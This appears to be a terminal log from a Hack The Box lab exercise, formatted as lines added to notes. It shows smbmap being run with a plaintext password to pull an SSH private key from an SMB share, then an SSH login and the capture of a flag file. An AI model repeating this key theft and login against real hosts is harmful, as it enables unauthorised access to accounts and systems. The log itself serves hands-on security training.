+The authenticity of host '10.129.1.15 (10.129.1.15)' can't be established.
+ED25519 key fingerprint is SHA256:HfXWue9Dnk+UvRXP6ytrRnXKIRSijm058/zFrj/1LvY.
+This key is not known by any other names.
+Are you sure you want to continue connecting (yes/no/[fingerprint])? yes
+Warning: Permanently added '10.129.1.15' (ED25519) to the list of known hosts.
+jason@10.129.1.15: Permission denied (publickey).
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 --download "GGJ\id_rsa" -u jason -p 34c8zuNBo91!@28Bszh
+bash: !@28Bszh: event not found
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 --download "GGJ\id_rsa" -u "jason" -p "34c8zuNBo91!@28Bszh"
+bash: !@28Bszh: event not found
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 --download "GGJ\id_rsa" -u "jason" -p `34c8zuNBo91!@28Bszh`
+bash: !@28Bszh`: event not found
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ smbmap -H 10.129.1.15 --download "GGJ\id_rsa" -u "jason" -p 34c8zuNBo91\!@28Bszh
+
+    ________  ___      ___  _______   ___      ___       __         _______
+   /"       )|"  \    /"  ||   _  "\ |"  \    /"  |     /""\       |   __ "\
+  (:   \___/  \   \  //   |(. |_)  :) \   \  //   |    /    \      (. |__) :)
+   \___  \    /\  \/.    ||:     \/   /\   \/.    |   /' /\  \     |:  ____/
+    __/  \   |: \.        |(|  _  \  |: \.        |  //  __'  \    (|  /
+   /" \   :) |.  \    /:  ||: |_)  :)|.  \    /:  | /   /  \   \  /|__/ \
+  (_______/  |___|\__/|___|(_______/ |___|\__/|___|(___/    \___)(_______)
+-----------------------------------------------------------------------------
+SMBMap - Samba Share Enumerator v1.10.7 | Shawn Evans - ShawnDEvans@gmail.com
+                     https://github.com/ShawnDEvans/smbmap
+
+[\] Checking for open ports...                                                                          [*] Detected 1 hosts serving SMB
+[|] Authenticating...                                                                                   [/] Authenticating...                                                                                   [*] Established 1 SMB connections(s) and 1 authenticated session(s)
+[-] Authenticating...                                                                                   [+] Starting download: GGJ\id_rsa (3381 bytes)
+[\] Authenticating...                                                                                   [+] File output to: /home/crimsonguard/10.129.1.15-GGJ_id_rsa
+[|] Closing connections..                                                                               [/] Closing connections..                                                                               [-] Closing connections..                                                                               [*] Closed 1 connections                                                                            
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ls
+10.129.1.15-GGJ_id_rsa                    Downloads                                 pws.list
+1.php                                     fc2b7f37-b1cb-4a08-b7ff-a662ad2cdf3b.zip  reverse.jpg
+7780f216-a583-4f75-b77a-d8f5abae29c4.zip  Music                                     Templates
+cacert.der                                my_data                                   users.list
+Desktop                                   phpbash.php                               Videos
+Documents                                 Pictures
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ssh jason@10.129.1.15 -i 10.129.1.15-GGJ_id_rsa 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0664 for '10.129.1.15-GGJ_id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "10.129.1.15-GGJ_id_rsa": bad permissions
+jason@10.129.1.15: Permission denied (publickey).
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ chmod 644 10.129.1.15-GGJ_id_rsa 
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ssh jason@10.129.1.15 -i 10.129.1.15-GGJ_id_rsa 
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+@         WARNING: UNPROTECTED PRIVATE KEY FILE!          @
+@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
+Permissions 0644 for '10.129.1.15-GGJ_id_rsa' are too open.
+It is required that your private key files are NOT accessible by others.
+This private key will be ignored.
+Load key "10.129.1.15-GGJ_id_rsa": bad permissions
+jason@10.129.1.15: Permission denied (publickey).
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ chmod 600 10.129.1.15-GGJ_id_rsa 
+┌─[us-dedicated-215-dhcp]─[10.10.14.4]─[crimsonguard@htb-h5fmk44rjw]─[~]
+└──╼ [★]$ ssh jason@10.129.1.15 -i 10.129.1.15-GGJ_id_rsa 
+Welcome to Ubuntu 20.04.4 LTS (GNU/Linux 5.4.0-109-generic x86_64)
+
+ * Documentation:  https://help.ubuntu.com
+ * Management:     https://landscape.canonical.com
+ * Support:        https://ubuntu.com/advantage
+
+  System information as of Thu 28 May 2026 06:54:25 PM UTC
+
+  System load:  0.0                Processes:               231
+  Usage of /:   25.4% of 13.72GB   Users logged in:         0
+  Memory usage: 14%                IPv4 address for ens160: 10.129.1.15
+  Swap usage:   0%
+
+ * Super-optimized for small spaces - read how we shrank the memory
+   footprint of MicroK8s to make it the smallest full K8s around.
+
+   https://ubuntu.com/blog/microk8s-memory-optimisation
+
+0 updates can be applied immediately.
+
+
+Last login: Tue Apr 19 21:50:46 2022 from 10.10.14.20
+$ ls
+flag.txt
+$ cat flag.txt	
+HTB{SMB_4TT4CKS_2349872359}
+```
+
+---
+
